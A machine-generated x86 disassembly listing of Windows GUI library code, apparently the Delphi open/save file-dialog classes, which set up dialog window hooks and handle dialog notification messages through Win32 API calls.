[ ebx - 0x547d43fd ] ebp
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
sub ebp [ ebx - 0x547767fd ]
add ebp esp
sub_3a9e71c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3ab4d0c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx ] 0xb021
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x7
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
cmp [ esi + 0x254 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x250 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push 0x7
mov eax [ esi + 0x254 ]
push eax
call __imp_SendMessageA
mov [ ebx + 0xc ] eax
sub_3a9e790
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a83664
mov [ esi + 0x30 ] 0x1
push esi
push sub_3a9e8bc
call sub_3a84724
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9e7d8
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
call sub_3a847bc
lea eax [ esi + 0x40 ]
call sub_3a6efbc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x250 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a9e820
push esi
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xd4 ] 0x0
je r-xdata
call sub_3a9e438
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ad0b18
test eax eax
jne r-xdata
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
pop esi
retn
call sub_3a9e438
jmp r-xdata
sub_3a9e85c
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_3acfbf4
mov cl 0x1
sub_3a9e884
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_3a645d0
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a9e8bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a9e8e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a9e954
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3ad0b18
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_3ac41cc
mov [ ebp - 0x14 ] eax
call sub_3ac4024
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_3a9e9fd
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_3a9e9c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9e9cb
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_3a9e9cb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9ea04
mov eax [ ebp - 0x14 ]
call sub_3ac4290
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_3ac402c
mov eax [ ebp - 0x8 ]
add eax 0x40
call sub_3a6efbc
retn
sub_3a9ea38
test dl ch
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc03a9ea ] cl
add [ eax ] al
add al al
adc [ esi - 0x59ba37fd ] ah
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp * 8 + 0x344803a9 ]
cmpsb [ esi ] [ edi ]
add edx [ edx ]
push esp
inc esi
imul ebp [ ebp + 0x44 ] 0x6f6c6169
push edi
popad
insb
outsd
push edi
jo r-xdata
popad
insb
outsd
push edi
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 - 0x57 ] dl
add ecx [ eax + eax ]
add [ eax ] al
cmp dl ch
test eax 0xa645c803
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp * 8 - 0xeb3fc57 ]
test eax 0x46541603
imul ebp [ ebp + 0x53 ] 0x44657661
imul esp [ ecx + 0x6c ] 0x7257676f
popad
jb r-xdata
rol [ eax - 0x3974031e ] cl
call sub_3a64370
test bl bl
jle r-xdata
jo r-xdata
je r-xdata
jb r-xdata
call sub_3a64734
jb r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
pop ebx
retn
call sub_3ad948b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop esi
pop ebx
retn
mov eax esi
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x8 ] esi
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
jb r-xdata
push edi
push eax
jmp r-xdata
jb r-xdata
push edi
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
0xc03a9 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
sub_3a9eac4
cmp dl ch
test eax 0xa645c803
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp * 8 - 0xf3ffc57 ]
test eax 0x46541603
imul ebp [ ebp + 0x4f ] 0x446e6570
imul esp [ ecx + 0x6c ] 0x7257676f
popad
je r-xdata
jb r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x8 ] esi
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
push edi
jb r-xdata
push eax
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
popad
insb
outsd
push edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
popad
insb
outsd
push edi
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 - 0x57 ] dl
add ecx [ eax + eax ]
add [ eax ] al
cmp dl ch
test eax 0xa645c803
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp * 8 - 0xeb3fc57 ]
test eax 0x46541603
imul ebp [ ebp + 0x53 ] 0x44657661
imul esp [ ecx + 0x6c ] 0x7257676f
popad
jb r-xdata
rol [ eax - 0x3974031e ] cl
call sub_3a64370
test bl bl
jle r-xdata
jo r-xdata
call sub_3a64734
jb r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
pop ebx
retn
0xc03a9 0x0
call sub_3ad948b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop esi
pop ebx
retn
mov eax esi
jb r-xdata
push edi
sub_3a9eb08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
jmp r-xdata
fadd [ ebp - 0x5a ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp * 8 - 0xf3ffc57 ]
test eax 0x46541603
imul ebp [ ebp + 0x4f ] 0x446e6570
imul esp [ ecx + 0x6c ] 0x7257676f
popad
je r-xdata
jb r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x8 ] esi
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
push edi
jb r-xdata
push eax
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
popad
insb
outsd
push edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
popad
insb
outsd
push edi
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 - 0x57 ] dl
add ecx [ eax + eax ]
add [ eax ] al
cmp dl ch
test eax 0xa645c803
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp * 8 - 0xeb3fc57 ]
test eax 0x46541603
imul ebp [ ebp + 0x53 ] 0x44657661
imul esp [ ecx + 0x6c ] 0x7257676f
popad
jb r-xdata
rol [ eax - 0x3974031e ] cl
call sub_3a64370
test bl bl
jle r-xdata
jo r-xdata
call sub_3a64734
jb r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
pop ebx
retn
0xc03a9 0x0
call sub_3ad948b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop esi
pop ebx
retn
mov eax esi
jb r-xdata
push edi
sub_3a9eb6c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x8 ] esi
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9ebb4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a9ebe4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a9ed46
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_3a65338
mov ebx 0x1
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6e0bc
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9ed4d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x54 ]
call sub_3a9fe40
mov edi eax
lea eax [ edi + 0xc ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_3a6e0bc
mov ebx eax
test ebx ebx
je r-xdata
lea ecx [ esi + 0x1 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a99074
mov ebx eax
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ esi + 0x1 ]
add ebx eax
dec ebx
lea eax [ edi + 0x14 ]
push eax
mov ecx ebx
sub ecx esi
dec ecx
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_3a65798
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a65798
mov edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_3a6e0bc
mov esi eax
test esi esi
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a99074
mov esi eax
jmp r-xdata
mov ebx [ ebp - 0xc ]
inc ebx
mov eax [ ebp - 0xc ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
test esi esi
jne r-xdata
lea eax [ ebx + esi ]
dec eax
mov esi eax
sub_3a9ed60
push ebx
push esi
push edi
push ebp
mov esi eax
xor ebx ebx
mov edi rw-data
jae r-xdata
and edx 0x7f
bt [ eax + 0x64 ] edx
inc ebx
add edi 0x4
cmp bl 0x16
jne r-xdata
mov eax [ edi ]
mov ebp [ esi + 0x4 ]
or eax [ ebp + 0x60 ]
mov [ ebp + 0x60 ] eax
mov eax [ esi + 0x8 ]
mov edx ebx
cmp dl 0x1f
ja r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0xb8 ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esi + 0x4 ]
mov eax [ ebx + 0x60 ]
or eax [ r-xdata ]
mov [ ebx + 0x60 ] eax
sub_3a9edb8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3a9ef20
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
add eax 0x34
mov edx [ ebx + 0x7c ]
call sub_3a652f4
mov edx [ ebx + 0x74 ]
mov eax [ esi + 0x4 ]
call sub_3aa0e48
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_3a9fb6c
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x4 ]
call sub_3aa0e68
mov eax ebx
call sub_3a9fbc8
mov edi [ esi + 0x4 ]
mov [ edi + 0x50 ] eax
lea eax [ edi + 0x6c ]
mov edx [ ebx + 0x78 ]
call sub_3a652f4
cmp [ ebx + 0xaa ] 0x0
je r-xdata
cmp [ ebx + 0x9a ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x7c ] esi
mov [ eax + 0x78 ] sub_3a9ef34
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x84 ] esi
mov [ eax + 0x80 ] sub_3a9efc0
cmp [ ebx + 0xa2 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x9c ] esi
mov [ eax + 0x98 ] sub_3a9f024
test [ ebx + 0x65 ] 0x8
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0xac ] esi
mov [ eax + 0xa8 ] sub_3a9f0a0
mov eax esi
call sub_3a9ebe4
mov eax esi
call sub_3a9ed60
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0xa4 ] esi
mov [ eax + 0xa0 ] sub_3a9ef30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9ef27
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_3a652c4
retn
lea edx [ ebp - 0xc ]
mov eax [ esi + 0x4 ]
call sub_3aa0a7c
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x8 ]
add eax 0x80
call sub_3a652f4
mov eax [ esi + 0x4 ]
call sub_3aa0bb0
mov edx eax
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ esi + 0x8 ]
mov [ edx + 0x6c ] eax
sub_3a9ef34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_3a9efb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x8 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_3aa0a7c
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x80 ]
call sub_3a652f4
mov eax [ ebx + 0x4 ]
call sub_3aa0bb0
mov edx eax
mov eax [ esi + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
mov esi eax
mov edx eax
mov eax [ esi + 0xac ]
call [ esi + 0xa8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9efb8
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
sub_3a9efc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3a9f018
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_3aa0a7c
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x80 ]
call sub_3a652f4
mov edx [ ebx + 0x8 ]
mov eax [ esi + 0x9c ]
call [ esi + 0x98 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9f01f
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a9f024
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3a9f091
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_3aa0a7c
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x80 ]
call sub_3a652f4
mov eax [ ebx + 0x4 ]
call sub_3aa0bb0
mov edx eax
mov eax [ esi + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebx + 0x8 ]
mov eax [ esi + 0x94 ]
call [ esi + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9f098
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a9f0e0
push ebx
add esp 0xfffffefc
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_3a64260
lea eax [ esp + 0x4 ]
mov edx r-xdata
movzx ecx [ eax ]
inc ecx
call sub_3a639d4
jne r-xdata
add esp 0x104
pop ebx
retn
push esp
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
or [ esp ] 0x40000000
mov eax [ esp ]
push eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
sub_3a9f137
add [ edx ] dl
push esp
dec edi
jo r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x3300676f
leave
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aa0210
retn
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3a9f15c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_3a9e470
sub_3a9f1e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a9e790
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x60 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x64 ] eax
movzx eax [ r-xdata ]
mov [ esi + 0xb8 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x84 ] eax
mov [ esi + 0x6c ] 0x1
mov [ esi + 0x88 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a9f261
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x84 ]
call sub_3a64380
mov eax [ esi + 0x60 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a9e7d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a9f29c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_3a9fa50
mov eax edi
mov si 0xffed
call sub_3a6457c
mov ebx eax
mov eax [ edi + 0x84 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_3a9f2c8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x66 ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_3a9e908
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_3a9f30c ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_3a9f29c
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_3a6457c
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_3a6457c
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_3a6457c
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x70 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x70 ] eax
mov eax edi
mov si 0xffea
call sub_3a6457c
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_3a6457c
movzx eax [ esp ]
mov [ ebx + 0xc ] eax
sub_3a9f3c4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xaa ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_3a9f450
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a9f482
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_3a7eed0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9f489
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a9f48c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a839f4
push ebx
push sub_3a9f450
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_3a9f4d0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_3a652a0
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_3a655b8
mov eax [ ebx ]
call sub_3a65730
mov dl 0x7c
call sub_3a6e25c
mov ebx eax
test ebx ebx
je r-xdata
mov [ ebx ] 0x0
inc ebx
mov dl 0x7c
